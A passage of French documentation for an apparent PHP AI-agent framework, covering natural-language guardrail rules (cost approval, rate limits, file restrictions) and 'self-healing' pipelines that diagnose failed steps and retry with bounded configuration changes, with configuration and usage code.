| Règle de coût | "If cost exceeds $5, pause and ask" | ask + cost_exceeds |
| Limite de débit | "Max 10 bash calls per minute" | rate_limit + condition de débit |
| Restriction de fichier | "Don't touch .env files" | deny + tool_input_contains |
| Avertissement | "Warn if modifying config files" | warn + tool_input_contains |
| Règle de contenu | "All generated code must have error handling" | warn (à revoir) |

### Configuration

```php
'nl_guardrails' => [
    'enabled' => env('SUPERAGENT_NL_GUARDRAILS_ENABLED', false),
    'rules' => [
        'Never modify files in database/migrations',
        'If cost exceeds $5, pause and ask for approval',
        'Max 10 bash calls per minute',
    ],
],
```

### Utilisation

```php
use SuperAgent\Guardrails\NaturalLanguage\NLGuardrailFacade;

$compiled = NLGuardrailFacade::create()
    ->rule('Never modify files in database/migrations')
    ->rule('If cost exceeds $5, pause and ask for approval')
    ->rule('Max 10 bash calls per minute')
    ->rule("Don't touch .env files")
    ->compile();

echo "Total : {$compiled->totalRules}, Haute confiance : {$compiled->highConfidenceCount}\n";

foreach ($compiled->getNeedsReview() as $rule) {
    echo "À REVOIR : {$rule->originalText} (confiance : {$rule->confidence})\n";
}

$yaml = $compiled->toYaml();
```

### Dépannage

**Règle compilée avec faible confiance.** Le parseur utilise des patterns regex — reformulez pour correspondre aux formats supportés. Ex. : "No bash" → "Block all bash calls".

---

## 31. Pipelines Auto-Réparateurs

> Quand des étapes de pipeline échouent, diagnostiquez automatiquement la cause racine, créez un plan de réparation, appliquez des mutations intelligentes et réessayez — au-delà du simple retry avec une vraie adaptation.

### Aperçu

Les Pipelines Auto-Réparateurs remplacent la stratégie d'échec basique `retry` par une stratégie intelligente `self_heal` : diagnostiquer → planifier → muter → réessayer. Le système classifie les échecs en 8 catégories :

| Catégorie d'erreur | Stratégie de réparation | Exemple |
|---|---|---|
| `timeout` | Augmenter le timeout + simplifier | "Connection timed out after 60s" |
| `rate_limit` | Attendre + réessayer avec backoff | "429 Too Many Requests" |
| `model_limitation` | Upgrader le modèle + simplifier | "Token limit exceeded" |
| `resource_exhaustion` | Simplifier la tâche + réduire la sortie | "Out of memory" |
| `external_dependency` | Réessayer avec backoff | "Connection refused" |
| `tool_failure` | Modifier le prompt pour éviter l'outil échoué | "Tool execution error" |

### Configuration

```php
'self_healing' => [
    'enabled' => env('SUPERAGENT_SELF_HEALING_ENABLED', false),
    'max_heal_attempts' => (int) env('SUPERAGENT_SELF_HEALING_MAX_ATTEMPTS', 3),
    'diagnose_model' => env('SUPERAGENT_SELF_HEALING_DIAGNOSE_MODEL', 'sonnet'),
    'max_diagnose_budget' => (float) env('SUPERAGENT_SELF_HEALING_MAX_BUDGET', 0.50),
    'allowed_mutations' => ['modify_prompt', 'change_model', 'adjust_timeout', 'add_context', 'simplify_task'],
],
```

### Utilisation

```php
use SuperAgent\Pipeline\SelfHealing\SelfHealingStrategy;
use SuperAgent\Pipeline\SelfHealing\StepFailure;

$healer = new SelfHealingStrategy(config: ['max_heal_attempts' => 3]);

$failure = new StepFailure(
    stepName: 'deploy_service', stepType: 'agent',
    stepConfig: ['prompt' => 'Déployer en staging', 'timeout' => 60],
    errorMessage: 'Connection timed out after 60 seconds', errorClass: 'RuntimeException',
    stackTrace: null, attemptNumber: 1,
);

if ($healer->canHeal($failure)) {
    $result = $healer->heal($failure, function (array $mutatedConfig) {
        return $this->executeStep($mutatedConfig);
    });
    echo $result->wasHealed() ? "Réparé : {$result->summary}" : "Impossible de réparer : {$result->summary}";
}
```

### Dépannage

**Le réparateur échoue toujours.** Vérifiez `allowed_mutations` — si trop restrictif, le réparateur ne peut pas apporter de changements significatifs. Autorisez au moins `modify_prompt` et `adjust_timeout`.

**La réparation coûte trop cher.** L'agent de diagnostic utilise `sonnet` par défaut. Configurez `diagnose_model: haiku` pour un diagnostic moins coûteux.
